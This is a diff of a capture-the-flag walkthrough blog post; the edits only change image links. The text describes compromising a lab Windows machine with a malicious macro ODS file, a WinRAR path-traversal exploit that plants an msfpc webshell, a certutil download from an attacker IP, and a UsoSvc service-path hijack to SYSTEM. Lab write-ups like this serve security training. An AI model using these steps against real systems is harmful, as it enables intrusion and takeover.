@@ -68,13 +68,13 @@ We will try to use ```smbmap``` to take a peek:
 
 We get back one location.
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-93.png" >}}
+![](/images/2019/10/image-93.png)
 
 When we connect to the location we see there is nothing there. We can however upload files to the location but they are removed / deleted shortly after. Now the first post on the reblog talks about ods Phishing Attempts. That there are rules in place to analyze phishing files that we put to in the malware drop box. We might want to try uploading a hidden payload into an [ODS file](https://fileinfo.com/extension/ods) (Open Office Document Spreadsheet) and upload it to the dropbox.
 
 We will create a payload using ```Metasploit```. There is a ncie little blog post over on Rapid 7's blog on this topic. You can find it [here](https://blog.rapid7.com/2017/03/08/attacking-microsoft-office-openoffice-with-metasploit-macro-exploits/).
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-94.png" >}}
+![](/images/2019/10/image-94.png)
 
 After we've crafted the payload and upload it to the share, we don't seem to get any connection back. Now we know from reading the blog post that the yara rules will detect any 'run of the mill' things. I would consider a pre-made MSF payload to be pretty run of the mill. So we can craft our own payload. 
 
@@ -82,15 +82,15 @@ The idea is to use the above created .ods file and enter our own shell code insi
 
 So first we'll changed the .ods extension to a .zip and extract the contents. We then dig into the directory created to get to the file called Module1.xml: ```/msf/Basic/Standard/Module1.xml```. We then need to modify the ```Sub OnLoad``` function to execute our code rather than the Metasploit code.
 
-{{< figure src="__GHOST_URL__/content/images/2019/10/image-95.png" >}}
+![](/images/2019/10/image-95.png)
 
 We then upload the file to the malware share and wait..
 
-{{< figure src="__GHOST_URL__/content/images/2019/11/image-63.png" >}}
+![](/images/2019/11/image-63.png)
 
 Our listener lights up and we have a shell! We snag our user flag from Luke's Desktop and start to enumerate internally. In the Luke's Downloads folder we see a few installers:
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image.png" >}}
+![](/images/2019/12/image.png)
 
 What immediately stands out is WinRar. [This CVE](https://nvd.nist.gov/vuln/detail/CVE-2018-20250) came to mind almost immediately since I've seen it in the past. If you've not seen it before some quick googling of 'CVE + WinRar' would turn up this result as well. Since we already know this has a high likleyhood of being our next entry point, we can jump over to [Evil-WinRAR](https://github.com/manulqwerty/Evil-WinRAR-Gen). The trick here is to get the file to execute as our admin. Some basic internal enumeration shows us that we have ```IIS``` installed. We can combine that with the knowledge of the ```proj_drop``` folder to get us an executable location. With this knowledge we can craft a webshell payload and leverage that to pivot.
 
@@ -98,7 +98,7 @@ First we have to craft our payload. We'll use ```MSFPC``` or the traditional ```
 
 ```msfpc aspx tun0 4444```
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/mfspc.gif" >}}
+![](/images/2019/12/mfspc.gif)
 
 We then need to add this payload to a zip file with a traveral path.
 
@@ -115,15 +115,15 @@ Once we've created our malicous payload we can download it with ```certutil.exe`
 
 ```certutil.exe -urlcache -split -f "http://10.10.15.177/rf.rar" C:\Users\luke\Documents\ods\rf.rar```
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/payloadup.gif" >}}
+![](/images/2019/12/payloadup.gif)
 
 Once we upload it we wait for our session to come back. The blog does note that it is restarted every 4 minutes if it doesn't seem to be working. Once our session lights up we have a shell as ISUR. We get our shell and see if we can snag some tokens with ```incognito```.
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image-1.png" caption="" >}}
+![](/images/2019/12/image-1.png" caption=")
 
 We don't seem to have any that we can take. But our enumeration shows that we have ```Sysinternals``` installed. We can use ```accesschk``` to see what permissions we might have. We see that ```SERVICE``` has access to ```UsoSvc```.
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image-2.png" >}}
+![](/images/2019/12/image-2.png)
 
 And we know that [UsoSvc is exploitable](https://www.atredis.com/blog/cve-2018-0952-privilege-escalation-vulnerability-in-windows-standard-collector-service). We can create a standard .exe MSF payload and upload it to a directory, then change our path for UsoSvc to it. We then restart the service and should get a shell back as system.
 
@@ -142,7 +142,7 @@ Restart our service:
 
 We then see our new session light up as system!
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image-4.png" >}}
+![](/images/2019/12/image-4.png)
 
 We head to the Administrator desktop and grab our root flag!
 
